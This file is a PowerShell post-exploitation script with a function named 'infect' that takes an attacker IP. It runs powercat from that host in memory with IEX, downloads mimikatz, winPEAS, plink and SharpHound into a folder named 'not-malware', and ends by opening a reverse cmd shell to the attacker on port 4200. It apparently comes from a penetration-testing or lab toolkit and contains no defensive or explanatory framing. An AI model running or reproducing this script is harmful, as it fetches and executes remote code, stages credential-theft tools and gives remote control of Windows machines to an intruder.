function infect
{
	# first check the system info
	param(
	[alias('attackip')][string]$rhost=""
	)

	$type = systeminfo  | findstr /c:'System Type'
	
	# make the directory for our tools
	mkdir not-malware

# grab the arch
	$type = $type.substring(28,2)
	if ($type -eq "64"){
		# download the x64 versions

		if ($rhost){
			# powercat
			$url = 'http://' + $rhost + '/powercat.ps1'	
			IEX (new-object system.net.webclient).downloadstring($url)
			# winpeas
			$url = 'http://' + $rhost + '/windows-privesc/winPEAS.bat'
			invoke-webrequest -uri $url -outfile '.\not-malware\winpeas.bat'
			# mimikatz
			$url = 'http://' + $rhost + '/mimikatz/x64/mimikatz.exe'
			invoke-webrequest -uri $url -outfile '.\not-malware\mimikatz.exe'
			# plink
			$url = 'http://' + $rhost + '/tunneling/plink64.exe'
			invoke-webrequest -uri $url -outfile '.\not-malware\plink.exe'
			# sharphound
			$url = 'http://' + $rhost + '/BloodHound/Collectors/SharpHound.exe'
			invoke-webrequest -uri $url -outfile '.\not-malware\sharphound.exe'

			# rev shell
			powercat -c $rhost -p 4200 -e cmd
		}
		else {
			Write-Output 'error: no ip given'
		}
	}
	if ($type -eq "86"){
		if ($rhost){
			# powercat
			$url = 'http://' + $rhost + '/powercat.ps1'	
			IEX (new-object system.net.webclient).downloadstring($url)
			# winpeas
			$url = 'http://' + $rhost + '/windows-privesc/winPEAS.bat'
			invoke-webrequest -uri $url -outfile '.\not-malware\winpeas.bat'
			# mimikatz
			$url = 'http://' + $rhost + '/mimikatz/Win32/mimikatz.exe'
			invoke-webrequest -uri $url -outfile '.\not-malware\mimikatz.exe'
			# plink
			$url = 'http://' + $rhost + '/tunneling/plink32.exe'
			invoke-webrequest -uri $url -outfile '.\not-malware\plink.exe'
			# sharphound
			$url = 'http://' + $rhost + '/BloodHound/Collectors/SharpHound.exe'
			invoke-webrequest -uri $url -outfile '.\not-malware\sharphound.exe'

			# rev shell
			powercat -c $rhost -p 4200 -e cmd
		}
		else {
			Write-Output 'error: no ip given'
		}

	}

}


